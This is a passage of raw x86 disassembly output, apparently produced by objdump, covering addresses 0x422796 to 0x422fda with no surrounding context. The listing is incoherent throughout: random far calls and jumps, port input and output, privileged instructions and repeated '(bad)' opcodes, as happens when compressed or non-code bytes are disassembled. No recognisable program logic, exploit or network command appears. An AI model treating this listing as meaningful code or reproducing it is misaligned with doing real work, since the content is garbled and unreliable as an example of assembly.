  422796:	sbb    esp,esp
  422798:	cwde   
  422799:	adc    eax,0x14ccbf17
  42279e:	push   ss
  42279f:	call   0xfce1:0xe8d2a2e5
  4227a6:	fisttp DWORD PTR [esi]
  4227a8:	mov    bl,0x35
  4227aa:	cmp    DWORD PTR [ecx+0x69],0xffffffa3
  4227ae:	es sbb eax,0x30a19b91
  4227b4:	and    eax,DWORD PTR [ecx+edi*4]
  4227b7:	lea    eax,[esi-0xde335ee]
  4227bd:	repnz mov al,0x2a
  4227c0:	outs   dx,BYTE PTR ds:[esi]
  4227c1:	jmp    0x422836
  4227c3:	adc    BYTE PTR [edi],bl
  4227c5:	fbld   TBYTE PTR [edx]
  4227c7:	call   0x8a18:0x2686c7bc
  4227ce:	cmp    al,0x5f
  4227d0:	pop    ebp
  4227d1:	scas   al,BYTE PTR es:[edi]
  4227d2:	shl    DWORD PTR [edx+0x5e],1
  4227d5:	fsubr  DWORD PTR [ebx+0x58]
  4227d8:	sub    DWORD PTR [ecx-0x33],esp
  4227db:	or     al,0xd3
  4227dd:	adc    esp,DWORD PTR [ebp+0x18]
  4227e0:	ins    BYTE PTR es:[edi],dx
  4227e1:	xchg   ebp,eax
  4227e2:	xor    BYTE PTR [edi],bl
  4227e4:	stc    
  4227e5:	sub    ebx,eax
  4227e7:	adc    DWORD PTR [ebx],esi
  4227e9:	lods   eax,DWORD PTR ds:[esi]
  4227ea:	in     eax,0xa4
  4227ec:	ja     0x42280a
  4227ee:	aam    0x76
  4227f0:	sbb    cl,BYTE PTR [ebp+esi*4+0x616ce535]
  4227f7:	in     eax,dx
  4227f8:	fld    DWORD PTR [ebx-0x2e0c843f]
  4227fe:	shl    BYTE PTR ds:0xb0aad4de,1
  422804:	mov    ah,0xa5
  422806:	adc    eax,0xa4ed528
  42280b:	mov    dl,0x9a
  42280d:	add    DWORD PTR [esi-0x29cb3dd],0xffffffb2
  422814:	in     al,dx
  422815:	adc    eax,0xc4d8d732
  42281a:	loop   0x4227e3
  42281c:	popa   
  42281d:	push   esi
  42281e:	call   0x7f4efdf4
  422823:	scas   eax,DWORD PTR es:[edi]
  422824:	xor    dl,BYTE PTR [edx+0x6202a09]
  42282a:	xor    BYTE PTR [edx-0x32],0xae
  42282e:	(bad)  [ebp+0x21d84b0b]
  422834:	jbe    0x4228a6
  422836:	dec    edi
  422837:	sbb    DWORD PTR [ecx-0x64],0x75
  42283b:	lahf   
  42283c:	jp     0x422800
  42283e:	in     al,0x6d
  422840:	mov    ebx,0x527da1ba
  422845:	inc    esi
  422846:	ds in  eax,0x9c
  422849:	mov    ebx,esp
  42284b:	mov    dl,0x72
  42284d:	or     edx,ebp
  42284f:	adc    al,0x3
  422851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422852:	xchg   edi,eax
  422853:	pop    esp
  422854:	push   ds
  422855:	imul   esp,DWORD PTR [edi],0x64
  422858:	repz sti 
  42285a:	stos   BYTE PTR es:[edi],al
  42285b:	in     eax,dx
  42285c:	push   es
  42285d:	test   DWORD PTR [ebx+0x6251b167],0x6a440171
  422867:	(bad)  
  422868:	mov    bl,0xa7
  42286a:	call   0xa74cfbe
  42286f:	lds    esi,FWORD PTR [ecx+0x257f093e]
  422875:	loope  0x42283d
  422877:	pop    ebp
  422878:	sbb    cl,BYTE PTR [edi-0x79]
  42287b:	xor    bh,BYTE PTR [ebx]
  42287d:	jns    0x42284c
  42287f:	inc    esp
  422880:	push   es
  422881:	push   ebp
  422882:	xchg   edi,eax
  422883:	fcmovnbe st,st(2)
  422885:	mov    esi,0x6d779342
  42288a:	mov    ecx,0x829b4dd1
  42288f:	ins    BYTE PTR es:[edi],dx
  422890:	push   ss
  422891:	inc    ebp
  422892:	mov    eax,ecx
  422894:	xlat   BYTE PTR ds:[ebx]
  422895:	xchg   ecx,eax
  422896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422897:	adc    al,0xf1
  422899:	imul   eax,edi,0xffffff81
  42289c:	and    ebx,DWORD PTR [edi-0x41]
  42289f:	sub    ecx,DWORD PTR [esi+ebx*1-0x649fdb7b]
  4228a6:	adc    bh,BYTE PTR [eax-0x78]
  4228a9:	sbb    BYTE PTR [ebp+0x73],dh
  4228ac:	pop    eax
  4228ad:	xor    cl,BYTE PTR [edi-0xd]
  4228b0:	cmc    
  4228b1:	(bad)  
  4228b2:	call   0xdf73:0xd2588729
  4228b9:	ror    BYTE PTR [esi+esi*8],1
  4228bc:	mov    al,0x86
  4228be:	mov    esi,0x6d789147
  4228c3:	call   0x50346a82
  4228c8:	jno    0x422874
  4228ca:	jl     0x42292c
  4228cc:	sti    
  4228cd:	push   ss
  4228ce:	mov    edx,0x7056198f
  4228d3:	push   edx
  4228d4:	fisttp WORD PTR [ebx]
  4228d6:	jns    0x422874
  4228d8:	repnz add DWORD PTR [esi+0xcd5d758],eax
  4228df:	in     al,0x7d
  4228e1:	cdq    
  4228e2:	mov    ss,WORD PTR [esi]
  4228e4:	out    0xc4,eax
  4228e6:	xchg   ecx,eax
  4228e7:	xchg   esp,eax
  4228e8:	ja     0x42294b
  4228ea:	xchg   ebp,eax
  4228eb:	test   BYTE PTR [eax+0x79],0x64
  4228ef:	scas   eax,DWORD PTR es:[edi]
  4228f0:	addr16 jno 0x422969
  4228f3:	push   eax
  4228f4:	cmp    DWORD PTR [esi-0x5a],ebp
  4228f7:	(bad)  
  4228f8:	jecxz  0x4228c6
  4228fa:	mov    eax,ds:0xa8b8ae58
  4228ff:	and    eax,0x224fdb70
  422904:	or     BYTE PTR [ebx+ecx*2-0x28],dl
  422908:	hlt    
  422909:	cmp    bh,BYTE PTR [eax-0x11]
  42290c:	ins    BYTE PTR es:[edi],dx
  42290d:	jecxz  0x422938
  42290f:	ins    DWORD PTR es:[edi],dx
  422910:	inc    esi
  422911:	add    BYTE PTR [ecx+0x3f8a2b38],bl
  422917:	sub    dl,BYTE PTR [edx+0x11963b71]
  42291d:	sub    DWORD PTR [edi],ecx
  42291f:	imul   ebx,ecx,0x87ab938f
  422925:	mov    edi,0x30e4c6
  42292a:	loop   0x4228e2
  42292c:	and    bh,BYTE PTR [eax]
  42292e:	test   al,0x36
  422930:	mov    esp,0x78c1b0cf
  422935:	adc    cl,bh
  422937:	cli    
  422938:	sub    eax,0x20ddc7b6
  42293d:	xor    eax,0xa27abaac
  422942:	leave  
  422943:	push   ds
  422944:	in     al,0x5a
  422946:	mov    ebx,0x8241e768
  42294b:	pop    edx
  42294c:	mov    edx,0x18c5fa8f
  422951:	pop    esi
  422952:	pop    edi
  422953:	jae    0x422947
  422955:	sub    ah,BYTE PTR [eax+esi*4+0x20]
  422959:	mov    eax,ds:0x91e35561
  42295e:	pop    ebp
  42295f:	sbb    dh,ah
  422961:	cmp    al,0x67
  422963:	inc    eax
  422964:	mov    eax,ds:0x2e823811
  422969:	inc    esp
  42296a:	enter  0x30dd,0x25
  42296e:	pop    edx
  42296f:	std    
  422970:	push   ebp
  422971:	(bad)  
  422972:	pop    ebp
  422973:	int    0xfd
  422975:	sbb    DWORD PTR [edi-0x59],ebp
  422978:	in     al,0x5e
  42297a:	adc    al,0xad
  42297c:	aad    0x63
  42297e:	jnp    0x422917
  422980:	out    dx,al
  422981:	add    eax,0x20217cb4
  422986:	dec    esp
  422987:	or     al,0x47
  422989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42298a:	fcomp  QWORD PTR [eax]
  42298c:	xchg   edx,eax
  42298d:	inc    ebx
  42298e:	mov    ds:0xd44bdbff,al
  422993:	jg     0x4229e5
  422995:	sti    
  422996:	retf   
  422997:	xchg   edi,eax
  422998:	cmp    ebp,DWORD PTR [ebx+0x72]
  42299b:	mov    ah,0x75
  42299d:	push   edx
  42299e:	dec    eax
  42299f:	loopne 0x4229fc
  4229a1:	mov    edx,0x54d60f0c
  4229a6:	fimul  WORD PTR [edx-0x17c102b5]
  4229ac:	mov    dh,0x91
  4229ae:	imul   esp,DWORD PTR [edx-0x5b039457],0xc68bce16
  4229b8:	push   eax
  4229b9:	mov    bh,dl
  4229bb:	adc    esp,DWORD PTR [esi]
  4229bd:	aad    0x67
  4229bf:	out    0x15,eax
  4229c1:	jo     0x42295e
  4229c3:	fidivr DWORD PTR [ebx]
  4229c5:	inc    ebx
  4229c6:	jne    0x422953
  4229c8:	jo     0x4229f9
  4229ca:	cs push 0xffffff90
  4229cd:	jne    0x422981
  4229cf:	js     0x422970
  4229d1:	inc    esi
  4229d2:	cs pop eax
  4229d4:	out    0x92,al
  4229d6:	xchg   esi,eax
  4229d7:	push   edi
  4229d8:	push   ebp
  4229d9:	jnp    0x4229ab
  4229db:	inc    edi
  4229dc:	or     ch,dl
  4229de:	push   edx
  4229df:	(bad)  
  4229e1:	cmp    edx,edi
  4229e3:	ss inc ebp
  4229e5:	inc    edx
  4229e6:	mov    BYTE PTR [edi],dl
  4229e8:	pop    ecx
  4229e9:	test   DWORD PTR [esi-0x488055c6],esi
  4229ef:	sub    ecx,edi
  4229f1:	xchg   esi,eax
  4229f2:	(bad)  
  4229f3:	and    DWORD PTR [ecx+0x8f],eax
	...
  422a39:	add    BYTE PTR [eax],al
  422a3b:	add    BYTE PTR ds:0xfe3de0ab,dl
  422a41:	jg     0x422a20
  422a43:	stos   DWORD PTR es:[edi],eax
  422a44:	mov    esi,DWORD PTR [edi+0x2b57d01b]
  422a4a:	add    BYTE PTR [edi+ebp*2],dl
  422a4d:	adc    eax,DWORD PTR [ecx]
  422a4f:	add    BYTE PTR [edx],ah
  422a51:	pop    es
  422a52:	add    BYTE PTR [eax],al
  422a54:	icebp  
  422a55:	(bad)  
  422a56:	cld    
  422a57:	fwait
  422a58:	inc    edi
  422a59:	dec    esp
  422a5a:	les    eax,FWORD PTR ds:0xd5efe4f9
  422a60:	imul   esi,edi,0x6d1dfd0
  422a66:	push   dx
  422a68:	or     BYTE PTR [ebp+0x4174fb2d],ch
  422a6e:	mov    ds:0x77d6ccbe,al
  422a73:	adc    eax,0xc2b06ea6
  422a78:	pop    ecx
  422a79:	jmp    0xacfc:0x710130e3
  422a80:	in     eax,0x6
  422a82:	mov    dh,0xd2
  422a84:	call   0xa7604b43
  422a89:	daa    
  422a8a:	aam    0x29
  422a8c:	imul   esp,DWORD PTR [ebx],0x9ad916aa
  422a92:	out    dx,eax
  422a93:	jp     0x422b0c
  422a95:	jg     0x422a8d
  422a97:	adc    eax,0xb0ff9fbf
  422a9c:	inc    cl
  422a9e:	xor    eax,0x99c668c9
  422aa3:	lds    sp,DWORD PTR [edx]
  422aa6:	add    esi,ecx
  422aa8:	repnz imul edi,DWORD PTR [ebp-0x165a6aca],0xffffffba
  422ab0:	cmc    
  422ab1:	or     eax,0x8d0dc4f2
  422ab6:	or     DWORD PTR [ecx+ebp*8],0x7b
  422aba:	test   BYTE PTR [eax+edx*4+0x5283dbe0],0x71
  422ac2:	and    DWORD PTR [eax+0x7433a081],0xffffffab
  422ac9:	jbe    0x422adb
  422acb:	mov    al,0x93
  422acd:	xor    DWORD PTR [ecx+0x25],esi
  422ad0:	or     BYTE PTR [esi+0x52b9100f],dh
  422ad6:	inc    edx
  422ad7:	repz enter 0x2a07,0xe
  422adc:	in     eax,0x40
  422ade:	sbb    al,0x1
  422ae0:	mov    BYTE PTR [edi-0x538558c1],ah
  422ae6:	imul   ecx,DWORD PTR [ebp-0x15],0xc29ee810
  422aed:	sar    BYTE PTR [edi-0x79594ff7],1
  422af3:	ss push ss
  422af5:	in     eax,dx
  422af6:	push   edi
  422af7:	bound  esi,QWORD PTR ds:0x76f14e71
  422afd:	aad    0x58
  422aff:	enter  0x9c57,0xa0
  422b03:	pop    esp
  422b04:	sar    BYTE PTR [ebx],0xd3
  422b07:	in     al,dx
  422b08:	mov    al,ds:0x5709ce
  422b0d:	add    bh,ch
  422b0f:	jns    0x422ae6
  422b11:	ret    0x40b8
  422b14:	inc    ecx
  422b15:	in     eax,dx
  422b16:	jle    0x422b27
  422b18:	in     eax,dx
  422b19:	mov    dl,0x5f
  422b1b:	xchg   BYTE PTR [esi],bh
  422b1d:	inc    ecx
  422b1e:	popf   
  422b1f:	es test al,0x90
  422b22:	iret   
  422b23:	sub    edx,DWORD PTR [eax]
  422b25:	mov    esp,0x149c2d55
  422b2a:	sbb    DWORD PTR [edi-0x14],0x1b
  422b2e:	mov    bh,BYTE PTR [esi+edi*4]
  422b31:	int3   
  422b32:	and    ch,bh
  422b34:	sub    al,0x61
  422b36:	sub    esi,DWORD PTR [edi-0x1b]
  422b39:	pop    es
  422b3a:	push   ebp
  422b3b:	jle    0x422b26
  422b3d:	sbb    eax,0x1b088d8e
  422b42:	mov    ch,0xaa
  422b44:	xchg   DWORD PTR [esi+0xec045b8],ecx
  422b4a:	jg     0x422ba6
  422b4c:	xor    BYTE PTR [esi+eiz*2-0x30a8c35f],al
  422b53:	nop
  422b54:	call   0x22be12e1
  422b59:	cmp    DWORD PTR [esi+ebp*8+0x3d],esi
  422b5d:	push   ecx
  422b5e:	push   ebx
  422b5f:	jo     0x422b52
  422b61:	pop    esi
  422b62:	jne    0x422bd5
  422b64:	loopne 0x422bc0
  422b66:	rol    BYTE PTR [eax+0x2a],cl
  422b69:	dec    esp
  422b6a:	stos   BYTE PTR es:[edi],al
  422b6b:	and    DWORD PTR [esi],ebx
  422b6d:	out    0xa3,eax
  422b6f:	ja     0x422b61
  422b71:	xchg   edi,eax
  422b72:	push   cs
  422b73:	push   esi
  422b74:	scas   eax,DWORD PTR es:[edi]
  422b75:	xlat   BYTE PTR ss:[ebx]
  422b77:	aaa    
  422b78:	neg    dh
  422b7a:	push   edx
  422b7b:	mov    bl,BYTE PTR [edi]
  422b7d:	or     DWORD PTR [esi],ecx
  422b7f:	inc    ebx
  422b80:	pushf  
  422b81:	mov    al,0xa9
  422b83:	hlt    
  422b84:	test   dh,ah
  422b86:	(bad)  
  422b88:	push   0xffffffd8
  422b8a:	jnp    0x422b20
  422b8c:	imul   edi,DWORD PTR [ecx],0x80a54649
  422b92:	sub    DWORD PTR [esi+ecx*4-0x3ef254f],eax
  422b99:	stc    
  422b9a:	sub    ecx,DWORD PTR [ecx+0x2]
  422b9d:	fs lahf 
  422b9f:	sub    DWORD PTR [ecx-0x73],ecx
  422ba2:	aad    0x10
  422ba4:	inc    eax
  422ba5:	adc    BYTE PTR [edi-0x27],0xec
  422ba9:	popf   
  422baa:	mov    ds:0xe848d47,al
  422baf:	mov    edi,DWORD PTR [ecx-0x3880d9b0]
  422bb5:	and    eax,0xf7ae0a85
  422bba:	icebp  
  422bbb:	xchg   ecx,eax
  422bbc:	test   al,0x9b
  422bbe:	pop    eax
  422bbf:	push   esp
  422bc0:	jbe    0x422bc7
  422bc2:	daa    
  422bc3:	and    cl,BYTE PTR [ebp+0x4fb2fbe0]
  422bc9:	push   cs
  422bca:	jmp    0x422bb0
  422bcc:	pop    ss
  422bcd:	iret   
  422bce:	push   ebp
  422bcf:	sbb    eax,0x978b79ca
  422bd4:	cmp    eax,0x887512ca
  422bd9:	xor    eax,0x26ad993a
  422bde:	or     ah,BYTE PTR [eax]
  422be0:	loope  0x422be4
  422be2:	jmp    0xfa52d2ef
  422be7:	sub    BYTE PTR [edi+0x28c1778a],bl
  422bed:	jg     0x422b9f
  422bef:	mov    al,ds:0xed40491f
  422bf4:	mov    eax,ds:0xc9c6efa8
  422bf9:	xor    al,0x30
  422bfb:	mov    gs,WORD PTR [esi+0x63]
  422bfe:	push   cs
  422bff:	(bad)  
  422c00:	in     eax,0x4b
  422c02:	call   0xd2afd3ba
  422c07:	and    dl,BYTE PTR [ebp-0x75af3186]
  422c0d:	push   ss
  422c0e:	push   ecx
  422c0f:	inc    esp
  422c10:	ins    BYTE PTR es:[edi],dx
  422c11:	xchg   edi,eax
  422c12:	adc    BYTE PTR [edx-0x7e5aac8d],bl
  422c18:	xlat   BYTE PTR ds:[ebx]
  422c19:	cld    
  422c1a:	adc    edx,edi
  422c1c:	pusha  
  422c1d:	jge    0x422c53
  422c1f:	mov    dh,0x9f
  422c21:	in     al,0xfd
  422c23:	clc    
  422c24:	scas   eax,DWORD PTR es:[edi]
  422c25:	sbb    eax,0x36c3c177
  422c2a:	mov    edx,DWORD PTR cs:[edi+ecx*2+0x54]
  422c2f:	and    cl,BYTE PTR ss:[edx]
  422c32:	imul   eax,DWORD PTR [ebx*4+0x280bbc55],0xffffffae
  422c3a:	jge    0x422c17
  422c3c:	push   ebx
  422c3d:	cld    
  422c3e:	push   edi
  422c3f:	xchg   ebp,eax
  422c40:	push   ebp
  422c41:	fwait
  422c42:	jmp    0xa3e8:0x2655d21
  422c49:	fsub   DWORD PTR [edx]
  422c4b:	or     eax,0x2cf64670
  422c50:	pop    ss
  422c51:	xchg   edi,eax
  422c52:	sbb    BYTE PTR [edx],dh
  422c54:	sub    edi,0xd281d2f2
  422c5a:	sub    BYTE PTR [eax+0x1adfc9fb],dl
  422c60:	inc    esi
  422c61:	or     ah,BYTE PTR [ebx-0x183bd56d]
  422c67:	adc    DWORD PTR [edx+0x148ba42f],esp
  422c6d:	mov    bl,BYTE PTR [esi-0x5f6f9498]
  422c73:	xor    al,0x94
  422c75:	cmc    
  422c76:	jg     0x422c30
  422c78:	xor    ebp,ebx
  422c7a:	rcr    bl,0x49
  422c7d:	jge    0x422c53
  422c7f:	mov    esp,0x5c3efa22
  422c84:	sbb    eax,0x7debce30
  422c89:	and    ebp,DWORD PTR [edi+0x660266a7]
  422c8f:	xor    edx,DWORD PTR [eax+ebx*8+0x356f8623]
  422c96:	pop    eax
  422c97:	mov    esp,0xe91034b7
  422c9c:	data16 sbb BYTE PTR [ebx],dl
  422c9f:	and    ecx,edx
  422ca1:	mov    ?,WORD PTR [edi]
  422ca3:	and    ebx,DWORD PTR [ebp-0x5540a034]
  422ca9:	fwait
  422caa:	cmp    BYTE PTR [ebp+esi*8-0x141edde6],al
  422cb1:	addr16 xchg esp,eax
  422cb3:	jge    0x422c81
  422cb5:	cmc    
  422cb6:	(bad)  
  422cb7:	jl     0xb39c04e6
  422cbd:	mov    DWORD PTR [ebp-0x59],ebp
  422cc0:	popf   
  422cc1:	jmp    0x2d5c:0x8101951a
  422cc8:	mov    edx,0x3377bd34
  422ccd:	fbstp  TBYTE PTR [ebx-0x7c]
  422cd0:	ja     0x422c5f
  422cd2:	(bad)  
  422cd3:	jae    0x422c5d
  422cd5:	pop    ss
  422cd6:	pop    edi
  422cd7:	in     al,0xe2
  422cd9:	clc    
  422cda:	retf   
  422cdb:	pop    ss
  422cdc:	cmp    BYTE PTR [ebp+0x66],dl
  422cdf:	cwde   
  422ce0:	pushf  
  422ce1:	sbb    ecx,DWORD PTR [esi]
  422ce3:	fsubr  DWORD PTR [ebp+0x4c11ea6d]
  422ce9:	(bad)  
  422cea:	test   al,0x39
  422cec:	push   0xf14a4bea
  422cf1:	dec    edi
  422cf2:	inc    edx
  422cf3:	gs leave 
  422cf5:	dec    ebp
  422cf6:	pop    eax
  422cf7:	loopne 0x422c95
  422cf9:	sbb    edx,DWORD PTR ds:0xaa2d3586
  422cff:	fadd   st(2),st
  422d01:	xchg   edi,eax
  422d02:	mov    eax,DWORD PTR [esi+0x785f2789]
  422d08:	sub    esi,DWORD PTR [ebp+0x3b]
  422d0b:	and    edx,DWORD PTR [ebx-0x6918009d]
  422d11:	call   0xfe3c:0xcb9aeb9
  422d18:	cmp    dh,BYTE PTR [esi+0x2e]
  422d1b:	js     0x422d2e
  422d1d:	mov    al,0x85
  422d1f:	sbb    al,0x5c
  422d21:	fistp  WORD PTR fs:[esi+0x74]
  422d25:	xchg   DWORD PTR [eax-0x5dcd59d3],esp
  422d2b:	gs pop edi
  422d2d:	ror    DWORD PTR [ebx+0x54a1f289],cl
  422d33:	xchg   BYTE PTR [edi+0x56],al
  422d36:	adc    al,0x8e
  422d38:	xor    bh,0x62
  422d3b:	ja     0x422d66
  422d3d:	test   DWORD PTR [eax+0x7cf76dc7],esi
  422d43:	inc    esp
  422d44:	(bad)  
  422d45:	or     BYTE PTR [edx+0x79672524],bl
  422d4b:	pop    ebx
  422d4c:	sub    BYTE PTR [edx+0x0],bl
  422d4f:	into   
  422d50:	lods   eax,DWORD PTR ds:[esi]
  422d51:	cmp    al,0x44
  422d53:	in     al,dx
  422d54:	aas    
  422d55:	(bad)  
  422d57:	rcr    bl,0x59
  422d5a:	jb     0x422d41
  422d5c:	daa    
  422d5d:	xchg   BYTE PTR [esi],dh
  422d5f:	or     BYTE PTR [ecx+eax*1-0xc801852],al
  422d66:	test   al,0x4b
  422d68:	cmp    eax,0xb78b92ed
  422d6d:	jge    0x422d34
  422d6f:	test   al,0xa
  422d71:	xor    DWORD PTR [edi-0x5f],ebp
  422d74:	xor    al,0x80
  422d76:	sti    
  422d77:	push   eax
  422d78:	ja     0x422d38
  422d7a:	xchg   DWORD PTR [esi],edx
  422d7c:	push   eax
  422d7d:	loope  0x422d21
  422d7f:	sahf   
  422d80:	add    ah,bh
  422d82:	push   ebx
  422d83:	push   edi
  422d84:	cmp    eax,0x5c767a4c
  422d89:	addr16 (bad) 
  422d8b:	out    0x45,al
  422d8d:	(bad)  
  422d8e:	outs   dx,DWORD PTR ds:[esi]
  422d8f:	dec    edi
  422d90:	mov    ecx,0x7030f02f
  422d95:	(bad)  
  422d96:	gs scas eax,DWORD PTR es:[edi]
  422d98:	ror    ecx,0x71
  422d9b:	mov    eax,0x978d9d67
  422da0:	retf   
  422da1:	xchg   ebp,eax
  422da2:	push   0xffffffa2
  422da4:	xor    al,0x29
  422da6:	inc    edx
  422da7:	test   ax,0xf47b
  422dab:	lock mov cl,0xc
  422dae:	mov    esi,0x2909e2f9
  422db3:	xchg   ebp,eax
  422db4:	xchg   ebp,eax
  422db5:	daa    
  422db6:	dec    ecx
  422db7:	or     bl,cl
  422db9:	add    edi,DWORD PTR [ecx]
  422dbb:	mov    al,ds:0xd0276458
  422dc0:	add    ebx,DWORD PTR [eax+0x1e]
  422dc3:	sar    BYTE PTR [esi],cl
  422dc5:	ja     0x422e0b
  422dc7:	stos   BYTE PTR es:[edi],al
  422dc8:	mov    eax,0x10d5e6e5
  422dcd:	add    eax,0x21e8aae0
  422dd2:	shr    BYTE PTR [ebx-0x72],0x55
  422dd6:	int3   
  422dd7:	and    ecx,DWORD PTR [eax-0xd]
  422dda:	sub    eax,0x24bb89ed
  422ddf:	mov    bh,0x1f
  422de1:	(bad)
  422de6:	addr16 call 0x2b50293d
  422dec:	pop    ebp
  422ded:	ds out dx,al
  422def:	cli    
  422df0:	jl     0x422da6
  422df2:	call   0x171:0x5d169125
  422df9:	int3   
  422dfa:	sub    edx,edx
  422dfc:	popa   
  422dfd:	rol    BYTE PTR [ebx+0x4706cca2],cl
  422e03:	pop    ebp
  422e04:	cmp    eax,0x87ba0df
  422e09:	inc    eax
  422e0a:	cmp    eax,0x464d6d9e
  422e0f:	xchg   edi,eax
  422e10:	adc    DWORD PTR [eax+0x4f],ebx
  422e13:	fucompp 
  422e15:	xchg   ecx,eax
  422e16:	and    eax,0x729d7d18
  422e1b:	or     eax,eax
  422e1d:	imul   esp,DWORD PTR [ebx-0x6523f046],0xffffffe0
  422e24:	shl    DWORD PTR [ecx-0x70e49bd6],cl
  422e2a:	push   esi
  422e2b:	dec    eax
  422e2c:	dec    ebx
  422e2d:	out    0xd5,eax
  422e2f:	mov    ds:0xa2638036,eax
  422e34:	fmul   DWORD PTR [edi+0xa]
  422e37:	inc    esi
  422e38:	pop    ebx
  422e39:	xor    eax,DWORD PTR ds:0x5cd0fad3
  422e3f:	clc    
  422e40:	cmp    ah,0xd
  422e43:	lahf   
  422e44:	xchg   dh,cl
  422e46:	fnsave [edi*1+0x46bbfa7a]
  422e4d:	xor    al,BYTE PTR [edi+0x75]
  422e50:	sub    al,0x35
  422e52:	and    BYTE PTR [ecx+0x71],dh
  422e55:	popa   
  422e56:	out    0x29,al
  422e58:	mov    esi,0x6aa64900
  422e5d:	scas   eax,DWORD PTR es:[edi]
  422e5e:	shl    BYTE PTR [esi+ebp*4],cl
  422e61:	test   eax,0x3fe15179
  422e66:	cdq    
  422e67:	sub    BYTE PTR [edi+ecx*4-0x19e472f2],ch
  422e6e:	sub    edx,DWORD PTR [edi+0x7f]
  422e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e72:	data16 fisubr DWORD PTR [esi+0x5dc7baab]
  422e79:	(bad)  
  422e7a:	sbb    al,0xf1
  422e7c:	push   0x53
  422e7e:	call   0xaffa:0x574899f8
  422e85:	jno    0x422e88
  422e87:	adc    esp,DWORD PTR [edx-0x55]
  422e8a:	aad    0xd5
  422e8c:	xchg   edi,eax
  422e8d:	push   ss
  422e8e:	in     eax,0x2e
  422e90:	sub    esp,DWORD PTR [edi]
  422e92:	pop    ecx
  422e93:	inc    eax
  422e94:	rol    BYTE PTR [eax-0x333dee64],0xf5
  422e9b:	iret   
  422e9c:	mov    al,ds:0xce7ffa50
  422ea1:	xchg   edx,eax
  422ea2:	(bad)  
  422ea3:	mov    edi,0xf45be82e
  422ea8:	aas    
  422ea9:	call   0x6708:0xa65849ee
  422eb0:	sub    ah,cl
  422eb2:	adc    eax,0x6a9f15cd
  422eb7:	mov    bl,0x1b
  422eb9:	sub    BYTE PTR [ecx-0x5d1a42ec],ah
  422ebf:	and    al,0x7a
  422ec1:	rol    BYTE PTR [ebx],cl
  422ec3:	inc    esi
  422ec4:	in     al,dx
  422ec5:	les    esp,FWORD PTR cs:[ebp+0x61]
  422ec9:	add    bl,BYTE PTR [eax+0x22ba9d89]
  422ecf:	dec    ecx
  422ed0:	mov    edi,0xfce59a88
  422ed5:	sti    
  422ed6:	pop    es
  422ed7:	pushf  
  422ed8:	retf   
  422ed9:	or     al,0x6c
  422edb:	out    dx,eax
  422edc:	int3   
  422edd:	xchg   ecx,eax
  422ede:	in     al,0x83
  422ee0:	pop    eax
  422ee1:	out    dx,eax
  422ee2:	lock nop
  422ee4:	jb     0x422edd
  422ee6:	xor    ch,BYTE PTR [ecx]
  422ee8:	push   es
  422ee9:	les    ebp,FWORD PTR [edi-0x7f]
  422eec:	fisttp QWORD PTR [ecx-0x2b98455b]
  422ef2:	xchg   DWORD PTR [esi-0x11],edi
  422ef5:	loopne 0x422ea2
  422ef7:	ret    
  422ef8:	and    DWORD PTR [eax+0x4bec508e],ecx
  422efe:	adc    edx,DWORD PTR [ebp+0x7eba1d9e]
  422f04:	push   ebp
  422f05:	(bad)  
  422f06:	out    dx,al
  422f07:	stos   BYTE PTR es:[edi],al
  422f08:	dec    ebp
  422f09:	mov    dl,ah
  422f0b:	loope  0x422efb
  422f0d:	inc    ebx
  422f0e:	rcl    al,0xa8
  422f11:	mov    esp,0xfbd44494
  422f16:	test   eax,0x94f84611
  422f1b:	pop    ds
  422f1c:	and    BYTE PTR [ebp-0x1d],cl
  422f1f:	loope  0x422f94
  422f21:	xor    eax,0x487020ce
  422f26:	sbb    BYTE PTR [ecx+0xc],0x3b
  422f2a:	jb     0x422ede
  422f2c:	test   al,0x74
  422f2e:	and    ebp,DWORD PTR [esi-0x5928251e]
  422f34:	outs   dx,BYTE PTR ds:[esi]
  422f35:	mov    ebx,DWORD PTR ds:0x2495fdae
  422f3b:	lock pop eax
  422f3d:	sub    bh,bh
  422f3f:	push   ebx
  422f40:	leave  
  422f41:	das    
  422f42:	push   edi
  422f43:	add    al,0xae
  422f45:	adc    cl,dh
  422f47:	das    
  422f48:	jbe    0x422f4b
  422f4a:	sub    eax,0xc58e3ce2
  422f4f:	add    dh,BYTE PTR [eax+0x1f]
  422f52:	pop    ecx
  422f53:	dec    edx
  422f54:	fld    QWORD PTR gs:[ecx+0x1f4c08e2]
  422f5b:	or     ebx,ebp
  422f5d:	pop    esp
  422f5e:	sub    eax,0xae89f868
  422f63:	in     al,0x4c
  422f65:	add    ah,cl
  422f67:	mov    al,0x1b
  422f69:	cmp    BYTE PTR [ecx],0xcc
  422f6c:	pop    es
  422f6d:	pop    edx
  422f6e:	iret   
  422f6f:	scas   eax,DWORD PTR es:[edi]
  422f70:	scas   al,BYTE PTR es:[edi]
  422f71:	and    eax,0xb7c7a0e
  422f76:	xchg   dl,ah
  422f78:	dec    ebx
  422f79:	sub    al,0x9c
  422f7b:	or     BYTE PTR [eax-0x2eeb7230],dh
  422f81:	mov    WORD PTR [edi+0x34],ds
  422f84:	fisttp QWORD PTR [eax-0x38d905e8]
  422f8a:	push   esp
  422f8b:	jns    0x422fda
  422f8d:	retf   0xf9d7
  422f90:	xchg   edx,eax
  422f91:	fmul   DWORD PTR [ebp+0x4a]
  422f94:	xchg   ecx,eax
  422f95:	mov    ebx,0xd9de0c8a
  422f9a:	sbb    DWORD PTR [ecx+eiz*8+0x34],0x7f
  422f9f:	mov    esi,0x41f83de3
  422fa4:	mov    ebx,esp
  422fa6:	dec    ebx
  422fa7:	addr16 out 0xe4,eax
  422faa:	sub    bh,BYTE PTR [edi+ecx*2-0x714e4e50]
  422fb1:	jmp    0x422ffc
  422fb3:	scas   al,BYTE PTR es:[edi]
  422fb4:	pop    ds
  422fb5:	cmp    esi,ecx
  422fb7:	call   0xe411:0xa5b1b6ba
  422fbe:	jl     0x422fa9
  422fc0:	sub    dh,ah
  422fc2:	daa    
  422fc3:	out    0xee,al
  422fc5:	outs   dx,BYTE PTR ds:[esi]
  422fc6:	mov    dh,0x2e
  422fc8:	xlat   BYTE PTR ds:[ebx]
  422fc9:	dec    ecx
  422fca:	push   cs
  422fcb:	jle    0x422fc3
  422fcd:	mov    ebx,0x8b3974ae
  422fd2:	mov    esi,0x8efeb3c5
  422fd7:	adc    al,BYTE PTR [ebx]
  422fd9:	xchg   ecx,eax
  422fda:	jbe    0x422f9a
